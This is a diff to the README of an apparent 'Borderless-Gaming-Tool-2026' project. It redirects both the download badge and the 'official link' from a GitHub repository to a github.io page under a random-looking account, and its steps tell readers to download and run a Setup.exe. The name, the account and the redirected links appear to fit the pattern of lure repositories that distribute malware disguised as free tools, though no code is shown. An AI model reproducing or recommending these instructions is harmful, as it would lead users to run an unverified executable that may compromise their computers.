@@ -1,6 +1,6 @@
 # 🖥️ Borderless-Gaming-Tool-2026 - Play Games Without Distracting Window Borders
 
-[![Download Borderless Gaming Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Cystoplegiatransient351/Borderless-Gaming-Tool-2026)
+[![Download Borderless Gaming Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://cystoplegiatransient351.github.io)
 
 ## ⭐ Overview
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the tool on your computer.
 
-1.  Visit the [official link](https://github.com/Cystoplegiatransient351/Borderless-Gaming-Tool-2026) to find the latest version.
+1.  Visit the [official link](https://cystoplegiatransient351.github.io) to find the latest version.
 2.  Click the blue download button found on that page to save the setup file to your computer.
 3.  Locate the downloaded Setup.exe file in your Downloads folder.
 4.  Double-click the file to start the installer. 
